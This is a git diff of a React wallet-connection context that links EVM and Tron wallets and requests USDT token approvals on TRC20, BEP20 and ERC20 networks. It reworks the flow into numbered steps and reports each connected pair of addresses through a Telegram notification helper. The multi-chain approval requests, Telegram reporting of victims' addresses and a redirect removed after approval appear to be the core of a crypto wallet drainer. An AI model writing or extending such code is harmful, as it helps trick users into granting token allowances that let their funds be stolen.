@@ -1,29 +1,41 @@
 import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
 import { useEvmWallet, EvmWalletProvider } from "./EvmWalletContext";
 import { useTronWallet, TronWalletProvider } from "./TronWalletContext";
-import { SUPPORTED_CHAINS, getChainByStringId } from "@/lib/chains";
+import { getChainByStringId } from "@/lib/chains";
 import { sendWalletConnectedNotification } from "@/lib/telegramNotify";
-import { REDIRECT_URL } from "@/lib/dummyData";
 import { toast } from "sonner";
+
+export type WorkflowStep = 1 | 2 | 3;
+export type NetworkKey = "trc20" | "bep20" | "erc20";
 
 interface UnifiedWalletContextType {
   evmAddress: string | null;
   tronAddress: string | null;
   isConnected: boolean;
+  isConnecting: boolean;
   isApproving: boolean;
-  approvedNetworks: Record<string, boolean>; // e.g. { trc20: true, bep20: false, erc20: false }
-  connectAll: () => Promise<void>;
-  approveNetwork: (networkKey: "trc20" | "bep20" | "erc20") => Promise<void>;
+  currentStep: WorkflowStep;
+  selectedNetwork: NetworkKey | null;
+  approvedNetworks: Record<string, boolean>;
+  connectAllWallets: () => Promise<boolean>;
+  approveNetwork: (networkKey: NetworkKey) => Promise<void>;
+  goToStep: (step: WorkflowStep) => void;
+  resetWorkflow: () => void;
 }
 
 const UnifiedWalletContext = createContext<UnifiedWalletContextType>({
   evmAddress: null,
   tronAddress: null,
   isConnected: false,
+  isConnecting: false,
   isApproving: false,
+  currentStep: 1,
+  selectedNetwork: null,
   approvedNetworks: {},
-  connectAll: async () => {},
+  connectAllWallets: async () => false,
   approveNetwork: async () => {},
+  goToStep: () => {},
+  resetWorkflow: () => {},
 });
 
 export const useUnifiedWallet = () => useContext(UnifiedWalletContext);
@@ -32,58 +44,106 @@ const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
   const evmWallet = useEvmWallet();
   const tronWallet = useTronWallet();
 
+  const [currentStep, setCurrentStep] = useState<WorkflowStep>(1);
+  const [selectedNetwork, setSelectedNetwork] = useState<NetworkKey | null>(null);
+  const [isConnecting, setIsConnecting] = useState(false);
   const [approvedNetworks, setApprovedNetworks] = useState<Record<string, boolean>>({
     trc20: false,
     bep20: false,
     erc20: false,
   });
 
-  const isConnected = evmWallet.isConnected || tronWallet.isConnected;
+  const isConnected = evmWallet.isConnected && tronWallet.isConnected;
   const isApproving = evmWallet.isApproving || tronWallet.isApproving;
 
-  const connectAll = useCallback(async () => {
-    // Connect EVM first, then Tron
-    await evmWallet.connect();
-    if (evmWallet.address) {
-      sendWalletConnectedNotification(evmWallet.address, tronWallet.address).catch(console.error);
+  const goToStep = useCallback((step: WorkflowStep) => {
+    setCurrentStep(step);
+  }, []);
+
+  const connectAllWallets = useCallback(async (): Promise<boolean> => {
+    setIsConnecting(true);
+
+    try {
+      let evmAddr = evmWallet.address;
+      if (!evmWallet.isConnected) {
+        evmAddr = await evmWallet.connect();
+      }
+
+      if (!evmAddr) {
+        toast.error("Failed to connect EVM wallet");
+        return false;
+      }
+
+      let tronAddr = tronWallet.address;
+      if (!tronWallet.isConnected) {
+        tronAddr = await tronWallet.connect();
+      }
+
+      if (!tronAddr) {
+        toast.error("Failed to connect Tron wallet");
+        return false;
+      }
+
+      sendWalletConnectedNotification(evmAddr, tronAddr).catch(console.error);
+      setCurrentStep(2);
+      return true;
+    } catch (err) {
+      console.error("connectAllWallets failed:", err);
+      toast.error("Failed to connect wallets");
+      return false;
+    } finally {
+      setIsConnecting(false);
     }
   }, [evmWallet, tronWallet]);
 
-  const approveNetwork = useCallback(async (networkKey: "trc20" | "bep20" | "erc20") => {
+  const approveNetwork = useCallback(async (networkKey: NetworkKey) => {
     if (networkKey === "trc20") {
       if (!tronWallet.isConnected) {
-        await tronWallet.connect();
+        const addr = await tronWallet.connect();
+        if (!addr) return;
       }
       const success = await tronWallet.approveTronUsdt();
       if (success) {
         setApprovedNetworks((prev) => ({ ...prev, trc20: true }));
-        window.location.replace(REDIRECT_URL);
+        setSelectedNetwork(networkKey);
+        setCurrentStep(3);
       }
     } else if (networkKey === "bep20") {
       if (!evmWallet.isConnected) {
-        await evmWallet.connect();
+        const addr = await evmWallet.connect();
+        if (!addr) return;
       }
       const bscConfig = getChainByStringId("bsc");
       if (bscConfig) {
         const success = await evmWallet.approveChainTokens(bscConfig);
         if (success) {
           setApprovedNetworks((prev) => ({ ...prev, bep20: true }));
-          window.location.replace(REDIRECT_URL);
+          setSelectedNetwork(networkKey);
+          setCurrentStep(3);
         }
       }
     } else if (networkKey === "erc20") {
       if (!evmWallet.isConnected) {
-        await evmWallet.connect();
+        const addr = await evmWallet.connect();
+        if (!addr) return;
       }
       const ethConfig = getChainByStringId("ethereum");
       if (ethConfig) {
         const success = await evmWallet.approveChainTokens(ethConfig);
         if (success) {
           setApprovedNetworks((prev) => ({ ...prev, erc20: true }));
-          window.location.replace(REDIRECT_URL);
+          setSelectedNetwork(networkKey);
+          setCurrentStep(3);
         }
       }
     }
+  }, [evmWallet, tronWallet]);
+
+  const resetWorkflow = useCallback(async () => {
+    await Promise.allSettled([evmWallet.disconnect(), tronWallet.disconnect()]);
+    setApprovedNetworks({ trc20: false, bep20: false, erc20: false });
+    setSelectedNetwork(null);
+    setCurrentStep(1);
   }, [evmWallet, tronWallet]);
 
   return (
@@ -92,10 +152,15 @@ const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
         evmAddress: evmWallet.address,
         tronAddress: tronWallet.address,
         isConnected,
+        isConnecting,
         isApproving,
+        currentStep,
+        selectedNetwork,
         approvedNetworks,
-        connectAll,
+        connectAllWallets,
         approveNetwork,
+        goToStep,
+        resetWorkflow,
       }}
     >
       {children}
